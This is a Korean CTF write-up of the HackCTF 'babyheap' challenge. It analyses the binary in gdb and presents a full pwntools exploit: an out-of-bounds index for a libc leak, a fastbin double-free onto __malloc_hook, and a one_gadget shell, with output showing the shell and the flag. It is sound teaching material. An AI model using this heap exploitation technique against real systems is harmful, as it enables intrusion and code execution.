# [WriteUp]HackCTF - babyheap

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x0000000000400b1e <+0>:	push   rbp
   0x0000000000400b1f <+1>:	mov    rbp,rsp
   0x0000000000400b22 <+4>:	sub    rsp,0x10
   0x0000000000400b26 <+8>:	call   0x400886 <Init>
   0x0000000000400b2b <+13>:	call   0x4008e7 <menu>
   0x0000000000400b30 <+18>:	mov    eax,0x0
   0x0000000000400b35 <+23>:	call   0x40091b <input_number>
=> 0x0000000000400b3a <+28>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400b3d <+31>:	cmp    DWORD PTR [rbp-0x4],0x1
   0x0000000000400b41 <+35>:	jne    0x400b53 <main+53>
   0x0000000000400b43 <+37>:	mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000400b46 <+40>:	mov    edi,eax
   0x0000000000400b48 <+42>:	call   0x40096a <Malloc>
   0x0000000000400b4d <+47>:	add    DWORD PTR [rbp-0x8],0x1
   0x0000000000400b51 <+51>:	jmp    0x400b2b <main+13>
   0x0000000000400b53 <+53>:	cmp    DWORD PTR [rbp-0x4],0x2
   0x0000000000400b57 <+57>:	jne    0x400b60 <main+66>
   0x0000000000400b59 <+59>:	call   0x400a1c <Free>
   0x0000000000400b5e <+64>:	jmp    0x400b2b <main+13>
   0x0000000000400b60 <+66>:	cmp    DWORD PTR [rbp-0x4],0x3
   0x0000000000400b64 <+70>:	jne    0x400b6d <main+79>
   0x0000000000400b66 <+72>:	call   0x400a9d <Show>
   0x0000000000400b6b <+77>:	jmp    0x400b2b <main+13>
   0x0000000000400b6d <+79>:	mov    edi,0x0
   0x0000000000400b72 <+84>:	call   0x400788
End of assembler dump.
```

번호를 입력받아서 `Malloc()`, `Free()`, `Show()` 세 함수 중 하나를 실행하는 것을 반복하는 프로그램이다.

---

프로그램이 돌아가는 과정을 따라가다 보면 몇 가지 정보를 얻을 수 있다. 우선 `Malloc()`을 보자.

```bash
gdb-peda$ pd Malloc
Dump of assembler code for function Malloc:
...
   0x00000000004009c1 <+87>:	call   0x400768
   0x00000000004009c6 <+92>:	mov    rdx,rax
   0x00000000004009c9 <+95>:	mov    eax,DWORD PTR [rbp-0x14]
   0x00000000004009cc <+98>:	cdqe   
   0x00000000004009ce <+100>:	mov    QWORD PTR [rax*8+0x602060],rdx
...
```

`0x400768`은 `malloc()`의 PLT address이다. 다음과 같이 확인할 수 있다.

```bash
gdb-peda$ pd 0x400768
Dump of assembler code from 0x400768 to 0x400788::	Dump of assembler code from 0x400768 to 0x400788:
   0x0000000000400768:	jmp    QWORD PTR [rip+0x20186a]        # 0x601fd8
   0x000000000040076e:	xchg   ax,ax
   0x0000000000400770:	jmp    QWORD PTR [rip+0x20186a]        # 0x601fe0
   0x0000000000400776:	xchg   ax,ax
   0x0000000000400778:	jmp    QWORD PTR [rip+0x20186a]        # 0x601fe8
   0x000000000040077e:	xchg   ax,ax
   0x0000000000400780:	jmp    QWORD PTR [rip+0x20186a]        # 0x601ff0
   0x0000000000400786:	xchg   ax,ax
End of assembler dump.
gdb-peda$ got

/home/chykor12/HackCTF/babyheap:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000601fa0 R_X86_64_GLOB_DAT  free@GLIBC_2.2.5
0000000000601fa8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.5
0000000000601fb0 R_X86_64_GLOB_DAT  __stack_chk_fail@GLIBC_2.4
0000000000601fb8 R_X86_64_GLOB_DAT  printf@GLIBC_2.2.5
0000000000601fc0 R_X86_64_GLOB_DAT  read@GLIBC_2.2.5
0000000000601fc8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000601fd0 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601fd8 R_X86_64_GLOB_DAT  malloc@GLIBC_2.2.5
0000000000601fe0 R_X86_64_GLOB_DAT  setvbuf@GLIBC_2.2.5
0000000000601fe8 R_X86_64_GLOB_DAT  atoi@GLIBC_2.2.5
0000000000601ff0 R_X86_64_GLOB_DAT  __isoc99_scanf@GLIBC_2.7
0000000000601ff8 R_X86_64_GLOB_DAT  exit@GLIBC_2.2.5
0000000000602020 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000602030 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000602040 R_X86_64_COPY     stderr@@GLIBC_2.2.5
```

`0x400768`에는 `0x601fd8`에 저장되어 있는 주소로 점프하는 코드가 있는데, `0x601fd8`이 `malloc()`의 GOT address이기 때문에 `0x400768`은 `malloc()`의 PLT address로 생각할 수 있다. 

`Malloc+100`을 보면 할당받은 청크의 주소를 `0x602060+rax*8`이라는 주소에 저장하고 있다. `0x602060`의 메모리를 보면 다음과 같다.

```bash
gdb-peda$ x/10gx 0x602060
0x602060 <ptr>:	0x0000000000000000	0x0000000000000000
0x602070 <ptr+16>:	0x0000000000000000	0x0000000000000000
0x602080 <ptr+32>:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
```

`ptr`이라는 전역 변수의 주소임을 알 수 있다. `main+95`에서 `rbp-0x14`에 저장되어 있는 값을 `rax`로 복사하는데, `rbp-0x14`에는 다음의 과정을 거쳐서 값이 저장된다.

```bash
gdb-peda$ pd Malloc
Dump of assembler code for function Malloc:
...
   0x0000000000400972 <+8>:	mov    DWORD PTR [rbp-0x14],edi
...
gdb-peda$ pd main
Dump of assembler code for function main:
...
   0x0000000000400b43 <+37>:	mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000400b46 <+40>:	mov    edi,eax
   0x0000000000400b48 <+42>:	call   0x40096a <Malloc>
   0x0000000000400b4d <+47>:	add    DWORD PTR [rbp-0x8],0x1
...
```

`Malloc()`을 호출할 때마다 `main()`의 스택 프레임에서 `rbp-0x8`에 저장된 값을 `edi`로 옮기고, 호출이 끝나면 그 값에 1을 더한다. 즉, `rbp-0x8`에 저장된 값이 counter의 역할을 한다. 그러면 청크를 할당할 때마다 `ptr`, `ptr+0x8`, `ptr+0x10`, ... 순서로 청크의 주소를 저장한다는 것을 알 수 있다.

---

그렇다면 `Free()`에서 청크의 주소에 접근할 때도 같은 방식을 사용할 것이라고 유추할 수 있다. 

```bash
gdb-peda$ pd Free
Dump of assembler code for function Free:
...
   0x0000000000400a49 <+45>:	mov    edi,0x400c28
   0x0000000000400a4e <+50>:	mov    eax,0x0
   0x0000000000400a53 <+55>:	call   0x400780
   0x0000000000400a58 <+60>:	mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000400a5b <+63>:	test   eax,eax
   0x0000000000400a5d <+65>:	js     0x400a67 <Free+75>
   0x0000000000400a5f <+67>:	mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000400a62 <+70>:	cmp    eax,0x5
   0x0000000000400a65 <+73>:	jle    0x400a71 <Free+85>
   0x0000000000400a67 <+75>:	mov    edi,0x1
   0x0000000000400a6c <+80>:	call   0x400788
   0x0000000000400a71 <+85>:	mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000400a74 <+88>:	cdqe   
   0x0000000000400a76 <+90>:	mov    rax,QWORD PTR [rax*8+0x602060]
   0x0000000000400a7e <+98>:	mov    rdi,rax
   0x0000000000400a81 <+101>:	call   0x400730
...
gdb-peda$ x/s 0x400c28
0x400c28:	"%d"
```

`0x400780`은 `scanf()`의 PLT address이고, `0x400788`은 `exit()`의 PLT address이고, `0x400730`은 `free()`의 PLT address이다.

예상과 같이, `Free+90`에서 `rax*8+0x602060`에 있는 값을 `rax`에 넣고 있다. `Malloc()`에서는 counter가 6 이상이면 프로그램을 종료시키지만, `Free()`에서는 `rax`가 어떤 값이든 상관이 없다. 여기에서 out of bound(OOB) 취약점이 발생하여, `r` 권한을 가지고 있다면 어떤 주소라도 leak할 수 있게 된다.

---

여기까지 보고 대충 생각해보면 우선 GOT를 이용하여 libc를 leak하고, `system()`의 주소를 구한 후 `free()`의 GOT를 `system()`의 주소로 덮고 `"/bin/sh"`가 저장된 청크를 free시키면 쉘을 획득할 수 있을 것 같다. 그런데 보호기법을 확인해 보면 full relro가 걸려 있어서 GOT 영역에 w 권한이 없다. 따라서 GOT overwrite가 불가능하다.

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
gdb-peda$ vmmap
Start              End                Perm	Name
...
0x00601000         0x00602000         r--p	/home/chykor12/HackCTF/babyheap
...
```

그렇다면 malloc hook이나 free hook을 조작하는 방법을 생각해볼 수 있다.

> glibc malloc에는 hook이라는 기능이 있는데, `malloc()`, `free()`, `realloc()`이 호출되었을 때 hook에 값이 등록되어 있으면 그 주소로 점프하여 코드를 실행한다.

이를 이용하면, free hook에 fake chunk를 할당받아서 `system()`의 주소를 등록한 뒤에, `"/bin/sh"`가 저장되어 있는 청크를 `free()`해서 쉘을 획득하는 방법이 있다. free hook 주변에 fake chunk를 만들 만한 곳이 있는지 살펴보자.

```bash
gdb-peda$ x/20gx 0x7ffff7dd37a8-0x80
0x7ffff7dd3728 <proc_file_chain_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3738:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3748 <dealloc_buffers>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3758 <_IO_list_all_stamp>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3768 <list_all_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3778 <_IO_stdfile_2_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3788 <_IO_stdfile_1_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3798 <_IO_stdfile_0_lock+8>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd37a8 <__free_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd37b8 <next_to_use>:	0x0000000000000000	0x0000000000000000
```

fake chunk를 할당받으려면 fastbin의 size check를 통과할 수 있어야 하는데, 모든 메모리가 0으로 채워져 있어서 어려울 것 같다. malloc hook 주변의 메모리도 한번 살펴보자.

```bash
gdb-peda$ print &__malloc_hook
$132 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>
gdb-peda$ x/20gx 0x7ffff7dd1b10-0x80
0x7ffff7dd1a90 <_IO_wide_data_0+208>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1aa0 <_IO_wide_data_0+224>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ab0 <_IO_wide_data_0+240>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ac0 <_IO_wide_data_0+256>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ad0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92e20	0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7a92830	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
```

이번에는 몇 개의 값이 채워져 있는 것이 보인다. 여기서 주목할 것은 `0x7ffff7dd1af5`에 있는 `0x7f`라는 값이다. fastbin의 size check를 통과할 수 있는 값이기 때문에 이 부분에 fake chunk를 할당받을 수 있다. 그러면 청크의 시작 주소는 `0x7ffff7dd1aed`가 될 것이다.

```bash
gdb-peda$ x/20gx 0x7ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0xfff7a9283000007f	0x000000000000007f
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b6d <main_arena+77>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b7d <main_arena+93>:	0x0000000000000000	0x0000000000000000
```

malloc hook을 이용한 방법으로는, glibc malloc에서 오류가 발생했을 때의 메커니즘을 이용하는 것이 있다. `free()` 호출 중에 잘못된 인자(예를 들어 직전에 free된 청크의 주소)가 전달되었을 때, glibc는 오류를 내고 메시지를 출력한다.

```bash
[-------------------------------------code-------------------------------------]
   0x7ffff7def5df <_dl_load_cache_lookup+1359>:	mov    rdi,rcx
   0x7ffff7def5e2 <_dl_load_cache_lookup+1362>:	call   0x7ffff7df4ea0 <memcpy>
   0x7ffff7def5e7 <_dl_load_cache_lookup+1367>:	mov    rdi,rax
=> 0x7ffff7def5ea <_dl_load_cache_lookup+1370>:	call   0x7ffff7df3ec0 <__strdup>
   0x7ffff7def5ef <_dl_load_cache_lookup+1375>:	lea    rsp,[rbp-0x28]
   0x7ffff7def5f3 <_dl_load_cache_lookup+1379>:	pop    rbx
   0x7ffff7def5f4 <_dl_load_cache_lookup+1380>:	pop    r12
   0x7ffff7def5f6 <_dl_load_cache_lookup+1382>:	pop    r13
Guessed arguments:
arg[0]: 0x7fffffffcae0 ("/lib/x86_64-linux-gnu/libgcc_s.so.1")
```

같은 청크를 연속으로 free시키고 한 줄씩 코드를 실행시키면서(엔터 키를 몇백 번은 쳐야 한다. 이런 짓은 직접 하지 말자.) 내부 함수들을 관찰해 보면, `strdup()`을 호출하는 코드가 있다.

```bash
[-------------------------------------code-------------------------------------]
   0x7ffff7df3ec9 <__strdup+9>:	call   0x7ffff7df3f10 <strlen>
   0x7ffff7df3ece <__strdup+14>:	lea    rbx,[rax+0x1]
   0x7ffff7df3ed2 <__strdup+18>:	mov    rdi,rbx
=> 0x7ffff7df3ed5 <__strdup+21>:	call   0x7ffff7dd7a80 <malloc@plt>
   0x7ffff7df3eda <__strdup+26>:	test   rax,rax
   0x7ffff7df3edd <__strdup+29>:	je     0x7ffff7df3ef8 <__strdup+56>
   0x7ffff7df3edf <__strdup+31>:	add    rsp,0x8
   0x7ffff7df3ee3 <__strdup+35>:	mov    rdx,rbx
Guessed arguments:
arg[0]: 0x24 ('$')
```

그리고 `strdup()`의 내부에는 `malloc()`을 호출하는 코드가 있다. 이때 malloc hook에 one gadget의 주소를 넣어 두면 쉘을 획득할 수 있을 것이다.

> one gadget은 특정 조건을 만족시키면 그 가젯 하나만으로 쉘을 획득할 수 있는 가젯이다.

---

libc leak을 위해 `setvbuf()`의 GOT가 저장되어 있는 주소와 `ptr` 변수의 주소의 차이를 구하자. `ptr`은 `0x602060`에 위치한 것을 앞에서 확인했다.

```bash
gdb-peda$ got

/home/chykor12/HackCTF/babyheap:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
...
0000000000601fe0 R_X86_64_GLOB_DAT  setvbuf@GLIBC_2.2.5
...
gdb-peda$ find 0x601fe0
Searching for '0x601fe0' in: None ranges
Found 1 results, display max 1 items:
babyheap : 0x400650 --> 0x601fe0 --> 0x7ffff7a7ce70 (<__GI__IO_setvbuf>:	push   rbp)
gdb-peda$ p/u (0x602060-0x400650)/8
$3 = 262978
```

`show()` 함수에서 index에 `-262978`을 입력하면 `setvbuf()`의 주소를 얻을 수 있고, 오프셋을 계산해서 libc base, malloc hook의 주소를 구할 수 있을 것이다.

```bash
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/chykor12/HackCTF/babyheap
0x00601000         0x00602000         r--p	/home/chykor12/HackCTF/babyheap
0x00602000         0x00603000         rw-p	/home/chykor12/HackCTF/babyheap
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fde000 0x00007ffff7fe1000 rw-p	mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
gdb-peda$ print setvbuf
$5 = {<text variable, no debug info>} 0x7ffff7a7ce70 <__GI__IO_setvbuf>
gdb-peda$ p/x 0x7ffff7a7ce70-0x7ffff7a0d000
$6 = 0x6fe70
gdb-peda$ print &__malloc_hook
$7 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>
gdb-peda$ p/x 0x7ffff7dd1b10-0x7ffff7a0d000
$8 = 0x3c4b10
```

```python
from pwn import *

r = process("./babyheap")
# r = remote("ctf.j0n9hyun.xyz", 3030)

offset_setvbuf = 0x6fe70 # offset of setvbuf() from libc base
offset_mallochook = 0x3c4b10 # offset of malloc hook from libc base

def Malloc(size, content):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.recvuntil("content: ")
    r.send(content)

def Free(index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("index: ")
    pause()
    r.sendline(str(index))

def Show(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("index: ")
    r.sendline(str(index))

Show(-262978) # libc leak
addr_setvbuf = u64(r.recv(6).ljust(8, "\x00")) # address of setvbuf()
log.info("address of setvbuf() : " + hex(addr_setvbuf))
addr_libc = addr_setvbuf - offset_setvbuf # address of libc base
log.info("address of libc base : " + hex(addr_libc))
addr_mallochook = addr_libc + offset_mallochook # address of malloc hook
log.info("address of malloc hook : " + hex(addr_mallochook))
```

---

```python
Malloc(0x60, "AAAA") # index: 0
Malloc(0x60, "BBBB") # index: 1
Free(0)
Free(1)
Free(0)
Malloc(0x60, p64(addr_mallochook - 0x23)) # index: 2
Malloc(0x60, "AAAA") # index: 3
Malloc(0x60, "BBBB") # index: 4
```

malloc hook에 할당받을 fake chunk의 size 영역에 `0x7f`라는 값이 쓰여 있기 때문에 size가 `0x70`인 fastbin을 사용해야 하고, 그러면 `malloc(0x60)`으로 할당을 요청하면 된다.

`Malloc()`의 중간에 `pause()`를 걸고, 위의 코드까지 실행했을 때 bin의 상태를 살펴보자.

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7fc114c3faed (size error (0x78)) --> 0xc114900e20000000 (invaild memory)
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0xe140e0 (size : 0x20f20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

`size error (0x78)`는 무시해도 된다. 문제없이 할당된다. 이제 malloc hook에 one gadget의 주소를 넣어 주기만 하면 된다.

---

사용할 one gadget을 찾아보자.

```bash
chykor12@ubuntu:~$ one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

디버깅해서 조건이 맞는 one gadget을 확인해보자.

```bash
gdb-peda$ x/4gx 0x7ffff7dd1b10
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
gdb-peda$ set {int}0x7ffff7dd1b10=256
gdb-peda$ x/4gx 0x7ffff7dd1b10
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000100	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
```

malloc hook에 임의의 값을 집어넣고, double free corruption을 발생시켜서 `malloc()` 안쪽으로 들어가보자.

```bash
gdb-peda$ pd __GI___libc_malloc
Dump of assembler code for function __GI___libc_malloc:
...
   0x00007ffff7a91136 <+6>:	mov    rax,QWORD PTR [rip+0x33fdb3]        # 0x7ffff7dd0ef0
   0x00007ffff7a9113d <+13>:	mov    rax,QWORD PTR [rax]
   0x00007ffff7a91140 <+16>:	test   rax,rax
   0x00007ffff7a91143 <+19>:	jne    0x7ffff7a91298 <__GI___libc_malloc+360>
...
   0x00007ffff7a91298 <+360>:	mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7a9129d <+365>:	add    rsp,0x8
   0x00007ffff7a912a1 <+369>:	pop    rbx
   0x00007ffff7a912a2 <+370>:	pop    rbp
=> 0x00007ffff7a912a3 <+371>:	jmp    rax
...
End of assembler dump.
```

이 부분이 malloc hook이 작동하는 부분이다. `0x7ffff7dd0ef0`에는 malloc hook의 주소가 저장되어 있기 때문에 `__GI___libc_malloc+16`에서 `rax`는 malloc hook에 저장되어 있는 값이고, 0이 아니면 `__GI___libc_malloc+360`으로 점프하여 진행하게 된다. 그리고 `__GI___libc_malloc+371`에서 malloc hook에 저장되어 있는 주소로 점프한다. 이때 메모리를 보면 다음과 같다.

```bash
gdb-peda$ x/20gx $rsp
0x7fffffffcab8:	0x00007ffff7df3eda	0x000000001ebf88b1
0x7fffffffcac8:	0x00007ffff7fd8df9	0x00007fffffffcb90
0x7fffffffcad8:	0x00007ffff7def5ef	0x3638782f62696c2f
0x7fffffffcae8:	0x756e696c2d34365f	0x696c2f756e672d78
0x7fffffffcaf8:	0x732e735f63636762	0x00007fff00312e6f
0x7fffffffcb08:	0x0000000000000000	0x0000000090000001
0x7fffffffcb18:	0x00007ffff7def5c4	0x0000000000000000
0x7fffffffcb28:	0xffffffff00000000	0x0000000000000000
0x7fffffffcb38:	0x000000000f8bfbff	0x0000000000040f12
0x7fffffffcb48:	0x00007ffff7fd8df9	0x000000000000024e
```

`rsp+0x50`에 `NULL`이 저장되어 있는 것을 확인할 수 있다. 오프셋이 `0xf02a4`인 one gadget을 사용하면 우리가 원하는 대로 작동할 것이다.(사실 가젯을 고를 때 이렇게 디버깅까지 하면서 정확하게 할 필요는 없는 것 같다. 그냥 이것저것 써 보다가 되는 거 하나 찾으면 끝.)

---

```python
# exploit_babyheap.py

from pwn import *

# r = process("./babyheap")
r = remote("ctf.j0n9hyun.xyz", 3030)

offset_setvbuf = 0x6fe70 # offset of setvbuf() from libc base
offset_mallochook = 0x3c4b10 # offset of malloc hook from libc base
offset_onegadget = 0xf02a4 # offset of onegadget from libc base

def Malloc(size, content):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.recvuntil("content: ")
    pause()
    r.send(content)

def Free(index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("index: ")
    r.sendline(str(index))

def Show(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("index: ")
    r.sendline(str(index))

Show(-262978) # libc leak
addr_setvbuf = u64(r.recv(6).ljust(8, "\x00")) # address of setvbuf()
log.info("address of setvbuf() : " + hex(addr_setvbuf))
addr_libc = addr_setvbuf - offset_setvbuf # address of libc base
log.info("address of libc base : " + hex(addr_libc))
addr_mallochook = addr_libc + offset_mallochook # address of malloc hook
log.info("address of malloc hook : " + hex(addr_mallochook))
addr_onegadget = addr_libc + offset_onegadget # address of one gadget
log.info("address of one gadget : " + hex(addr_onegadget))

Malloc(0x60, "AAAA") # index: 0
Malloc(0x60, "BBBB") # index: 1
Free(0)
Free(1)
Free(0)
Malloc(0x60, p64(addr_mallochook - 0x23)) # index: 2
Malloc(0x60, "AAAA") # index: 3
Malloc(0x60, "BBBB") # index: 4
Malloc(0x60, "A"*0x13 + p64(addr_onegadget)) # index: 5
Free(2)
Free(2) # double free corruption

r.interactive()
```

```bash
chykor12@ubuntu:~/HackCTF$ python exploit_babyheap.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3030: Done
[*] address of setvbuf() : 0x7f6fac45ce70
[*] address of libc base : 0x7f6fac3ed000
[*] address of malloc hook : 0x7f6fac7b1b10
[*] address of one gadget : 0x7f6fac4dd2a4
[*] Switching to interactive mode
*** Error in `./main': double free or corruption (fasttop): 0x0000000001914010 ***
$ whoami
attack
$ ls
flag
main
$ cat flag
HackCTF{51mp13_f457b1n_dup!!}
```

